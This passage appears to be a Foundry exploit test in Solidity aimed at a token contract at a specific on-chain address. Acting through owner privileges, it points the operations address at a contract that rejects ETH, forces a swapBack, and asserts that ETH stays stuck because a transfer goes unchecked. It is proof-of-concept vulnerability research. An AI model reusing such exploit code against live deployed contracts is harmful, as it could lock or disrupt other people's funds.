    function dexRouter() external view returns (IDexRouter);
    function forceSwapBack() external;
}

contract MaliciousContract {
    // No payable receive/fallback - will reject ETH transfers
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker;
    IFoundationToken token;
    MaliciousContract malicious;

    // ─── Setup ───────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        token = IFoundationToken(TARGET);
        malicious = new MaliciousContract();
        vm.label(TARGET, "FoundationToken");
        vm.label(attacker, "Attacker");
        vm.label(address(malicious), "MaliciousContract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get owner address
        address owner = token.owner();
        vm.label(owner, "Owner");

        // Get LP pair address
        address lpPair = token.lpPair();
        console.log("LP Pair:", lpPair);

        // FIRST: Enable trading as owner
        vm.startPrank(owner);
        token.enableTrading();
        vm.stopPrank();

        console.log("Trading enabled");

        // Transfer tokens to attacker for liquidity
        uint256 liquidityAmount = token.swapTokensAtAmount() * 10;
        console.log("Liquidity amount:", liquidityAmount);

        vm.startPrank(owner);
        token.transfer(attacker, liquidityAmount);
        vm.stopPrank();

        // Approve router for liquidity and add liquidity (tokens + ETH)
        vm.startPrank(attacker);
        token.approve(address(token.dexRouter()), liquidityAmount);

        (uint256 amountToken, uint256 amountETH, ) = token.dexRouter().addLiquidityETH{
            value: 10 ether
        }(
            address(token),
            liquidityAmount,
            0,
            0,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        console.log("Added liquidity - Token:", amountToken, "ETH:", amountETH);

        // Set malicious operations address
        vm.startPrank(owner);
        token.setOperationsAddress(address(malicious));
        vm.stopPrank();

        console.log("Malicious operations address set:", address(malicious));

        // Transfer tokens to LP pair to accumulate fees in contract
        uint256 transferAmount = token.swapTokensAtAmount() * 5;
        vm.startPrank(attacker);
        token.transfer(lpPair, transferAmount);
        vm.stopPrank();

        console.log("Contract token balance:", token.balanceOf(TARGET));
        console.log("Tokens for operations:", token.tokensForOperations());
        console.log("Contract ETH balance before swapBack:", address(TARGET).balance);

        // Force swapBack as owner to trigger the vulnerable code
        vm.startPrank(owner);
        token.forceSwapBack();
        vm.stopPrank();

        // Check if ETH is stuck after swapBack
        uint256 finalBalance = address(TARGET).balance;
        console.log("Final contract balance:", finalBalance);
        console.log("Tokens for operations after:", token.tokensForOperations());

        // Oracle check - balance should be 0 after swapBack but isn't due to unchecked transfer
        assertGt(finalBalance, 0, "ETH should be stuck in contract due to unchecked transfer vulnerability");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

